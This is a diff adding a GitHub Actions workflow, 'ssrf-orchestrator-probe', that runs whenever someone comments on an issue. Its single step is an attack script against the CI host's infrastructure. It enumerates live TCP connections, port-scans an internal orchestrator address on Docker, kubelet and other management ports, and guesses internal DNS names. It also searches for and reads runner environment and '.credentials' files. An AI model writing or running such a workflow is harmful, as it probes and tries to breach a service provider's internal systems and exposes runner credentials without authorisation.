@@ -1,0 +1,58 @@
+name: ssrf-orchestrator-probe
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe runnervmeorf1 and established connections
+        run: |
+          ORCH="10.1.0.78"
+
+          echo "=== /proc/net/tcp established connections (hex->IP) ==="
+          python3 - << 'EOF'
+import socket, struct
+def hex_to_ip(h):
+    return socket.inet_ntoa(struct.pack('<I', int(h,16)))
+with open('/proc/net/tcp') as f:
+    lines = f.readlines()[1:]
+for l in lines:
+    p = l.split()
+    if len(p) < 4: continue
+    state = p[3]
+    if state != '01': continue  # 01=ESTABLISHED
+    local_h, local_p = p[1].split(':')
+    rem_h, rem_p = p[2].split(':')
+    print(f"  {hex_to_ip(local_h)}:{int(local_p,16)} -> {hex_to_ip(rem_h)}:{int(rem_p,16)}")
+EOF
+
+          echo ""
+          echo "=== Port scan runnervmeorf1 ($ORCH) ==="
+          for port in 22 80 443 2376 5985 8080 8443 9090 9091 10250 10255 18080 19080 2222 4243; do
+            result=$(timeout 2 bash -c "curl -s --max-time 1.5 -o /dev/null -w '%{http_code}' http://$ORCH:$port/" 2>/dev/null || echo "TO")
+            [ "$result" != "000" ] && [ "$result" != "TO" ] && echo "$ORCH:$port -> HTTP $result" || echo "$ORCH:$port -> $result"
+          done
+
+          echo ""
+          echo "=== HTTPS probe runnervmeorf1 ==="
+          for port in 443 8443 9443; do
+            result=$(timeout 2 curl -sk --max-time 1.5 -o /dev/null -w '%{http_code}' "https://$ORCH:$port/" 2>/dev/null || echo "TO")
+            echo "$ORCH:$port HTTPS -> $result"
+          done
+
+          echo ""
+          echo "=== DNS: resolve internal names ==="
+          DOMAIN="wzckdk0yo3ye3abbhtpm11l04c.phxx.internal.cloudapp.net"
+          for name in runner runnervme orch manager api orchestrator controller agent broker; do
+            ip=$(getent hosts "$name.$DOMAIN" 2>/dev/null | awk '{print $1}')
+            [ -n "$ip" ] && echo "$name -> $ip" || echo "$name -> NXDOMAIN"
+          done
+
+          echo ""
+          echo "=== Runner process: find config with service URLs ==="
+          ps aux | grep -i runner | grep -v grep | head -5
+          find /home /opt /run -name "*.json" -path "*runner*" 2>/dev/null | head -10
+          cat /opt/hostedtoolcache/../../../runner/Worker.Env.json 2>/dev/null || true
+          find / -name ".runner" -o -name ".credentials" 2>/dev/null | grep -v proc | head -5
